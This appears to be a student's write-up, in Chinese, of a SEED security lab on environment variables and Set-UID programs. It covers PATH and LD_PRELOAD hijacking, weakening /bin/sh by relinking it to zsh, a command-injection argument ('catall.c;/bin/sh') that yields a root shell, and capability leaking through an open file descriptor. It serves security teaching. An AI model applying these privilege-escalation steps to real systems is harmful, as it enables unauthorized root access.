# Task 1: Manipulating Environment Variables

环境变量是个以=号连接的键值对，是隐式传入程序中的

- printenv和env命令可以在shell中打印出当前的环境变量
  - 使用grep获取某个特定值
- export命令和unset命令分别可以设置和去除环境变量

# Task 2: Passing Environment Variables from Parent Process to Child Process

使用gcc命令生成可执行文件，将父子进程printenv的结果分别重定向到两个不同的文件a和b，并用diff a b命令进行比对，发现没有区别

这说明通过fork的方式产生的父子进程的环境变量是相同的

# Task 3: Environment Variables and execve()

```c
#include <unistd.h>

extern char **environ;

int main()
{
  char *argv[2];

  argv[0] = "/usr/bin/env";
  argv[1] = NULL;

  execve("/usr/bin/env", argv, NULL);  

  return 0 ;
}

```

运行上面的程序没有任何输出，说明该进程没有继承任何的环境变量

将`execve("/usr/bin/env", argv, NULL);  `语句修改为`execve("/usr/bin/env", argv, environ);  `发现可以打印出环境变量

因此execve最后一个参数如果不指定的话，是默认不传递任何环境变量的

# Task 4: Environment Variables and system()

```
	   The  system()  library  function uses fork(2) to create a child process
       that executes the shell command specified in command using execl(3)  as
       follows:

           execl("/bin/sh", "sh", "-c", command, (char *) NULL);

       system() returns after the command has been completed.

       During  execution  of  the command, SIGCHLD will be blocked, and SIGINT
       and SIGQUIT will be  ignored,  in  the  process  that  calls  system().
       (These  signals  will be handled according to their defaults inside the
       child process that executes command.)

       If command is NULL, then system() returns a status indicating whether a
       shell is available on the system.

```



# Task 5: Environment Variable and Set-UID Programs

```
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root a.out 
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 a.out 
[10/31/22]seed@VM:~/lab/Labsetup$ ll a.out 
-rwsr-xr-x 1 root seed 16760 Oct 31 04:03 a.out

[10/31/22]seed@VM:~/lab/Labsetup$ export PATH="/usr/bin"
[10/31/22]seed@VM:~/lab/Labsetup$ export LD_LIBRARY_PATH="wdnmd"
[10/31/22]seed@VM:~/lab/Labsetup$ export wdnmd="nmsl"
```

- PATH:可执行文件的搜索路径

- LD_LIBRARY_PATH:用于告诉动态链接加载器在哪里寻找特定应用程序的共享库

```c
#include <stdio.h>
#include <stdlib.h>
extern char **environ;
int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
}
```

上面的程序打印出环境变量的值，发现PATH和wdnmd被更改，LD_LIBRARY_PATH没有被更改



# Task 6: The PATH Environment Variable and Set-UID Programs

使用`export PATH=$PWD:$PATH`命令将/home/seed加到path环境变量的前面

```
int main()
{
system("ls");
return 0;
}
```

编译一下上面的程序，当它执行的时候会fork出进程然后执行ls程序

将/bin/ls复制到当前目录，修改为suid程序

```shell
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root ls
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 ls
[10/31/22]seed@VM:~/lab/Labsetup$ ll ls
-rwsr-xr-x 1 root seed 16696 Oct 31 04:22 ls
```

由于/bin/sh 实际上是一个指向/bin/dash 的符号链接，dash有一个防御对策，可以防止自己在 Set-UID 进程中执行：如果检测到它是在 Set-UID 进程中执行的，它会立即将有效用户 ID 更改为进程的实际用户 ID，实际上就是放弃了特权。由于我们的受害者程序是一个 Set-UID 程序，所以/bin/dash 中的对策可以防止我们的攻击

为了正常进行攻击，修改sh指向：

```
sudo ln -sf /bin/zsh /bin/sh
```

此时你在shell中输入ls那么会执行当前目录下的ls程序

# Task 7: The LD PRELOAD Environment Variable and Set-UID Programs

> `LD_`开头的环境变量会影响动态链接器/加载器的行为
>
> fPIC：Generate position-independent code (PIC)，意味着生成的机器代码不依赖于位于特定的地址

```c
$ gcc -fPIC -g -c mylib.c
$ gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
$ export LD_PRELOAD=./libmylib.so.1.0.1

#include <stdio.h>
void sleep (int s)
{
/* If this is invoked by a privileged program,
you can do damages here! */
printf("I am not sleeping!\n");
}
```

`myproc.c`：

```c
#include <unistd.h>
extern char ** environ;
int main()
{
	int i = 0;
	while (environ[i] != NULL)
    	{
		if (strstr(environ[i],"LD_PRELOAD")!= NULL)
		{
		    printf("%s\n", environ[i]);
		    break;
		}
		else i++;
	}
	sleep(1);
	return 0;
}

```

## Make myprog a regular program, and run it as a normal user.

```
$ myprog 
LD_PRELOAD=./libmylib.so.1.0.1
I am not sleeping!
```

## Make myprog a Set-UID root program, and run it as a normal user.

```shell
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root myprog 
[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 myprog
[10/31/22]seed@VM:~/lab/Labsetup$ ll myprog
-rwsr-xr-x 1 root seed 16856 Oct 31 12:06 myprog

[10/31/22]seed@VM:~/lab/Labsetup$ ./myprog 
[10/31/22]seed@VM:~/lab/Labsetup$ 
```

这里什么都没有打印

## Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it

```
root@VM:/home/seed/lab/Labsetup# export LD_PRELOAD="/home/seed/lab/Labsetup/libmylib.so.1.0.1"
root@VM:/home/seed/lab/Labsetup# ./myprog
LD_PRELOAD=/home/seed/lab/Labsetup/libmylib.so.1.0.1
I am not sleeping!
```

在切换为root用户后，打印出了LD_PRELOAD环境变量，并且调用了我们设计的共享库的sleep函数

## Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account),export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.
和Make myprog a regular program, and run it as a normal user.结果相同

# Task 8: Invoking External Programs Using system() versus execve()

- system()会执行sh -c "a.out 1;/bin/sh"因此可以得到root权限的shell

- execve不可以

```
[10/31/22]seed@VM:~/lab/Labsetup$ ll a.out 
-rwsr-xr-x 1 root seed 16928 Oct 31 12:41 a.out
[10/31/22]seed@VM:~/lab/Labsetup$ a.out "catall.c;/bin/sh"
#

[10/31/22]seed@VM:~/lab/Labsetup$ a.out "catall.c;/bin/sh"
/bin/cat: 'catall.c;/bin/sh': No such file or directory
```

# Task 9: Capability Leaking

> The setuid() system call can be
> used to revoke the privileges. According to the manual, “setuid() sets the effective user ID of the calling
> process. If the effective UID of the caller is root, the real UID and saved set-user-ID are also set”. Therefore,
> if a Set-UID program with effective UID 0 calls setuid(n), the process will become a normal process,
> with all its UIDs being set to n

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

void main()
{
  int fd;
  char *v[2];

  /* Assume that /etc/zzz is an important system file,
   * and it is owned by root with permission 0644.
   * Before running this program, you should create
   * the file /etc/zzz first. */
  fd = open("/etc/zzz", O_RDWR | O_APPEND);        
  if (fd == -1) {
     printf("Cannot open /etc/zzz\n");
     exit(0);
  }

  // Print out the file descriptor value
  printf("fd is %d\n", fd);

  // Permanently disable the privilege by making the
  // effective uid the same as the real uid
  setuid(getuid());                                

  // Execute /bin/sh
  v[0] = "/bin/sh"; v[1] = 0;
  execve(v[0], v, 0);                             
}
```

虽然上面程序放弃了特权，但是fd被泄露，因此可以使用`echo xxx >&fd`写入

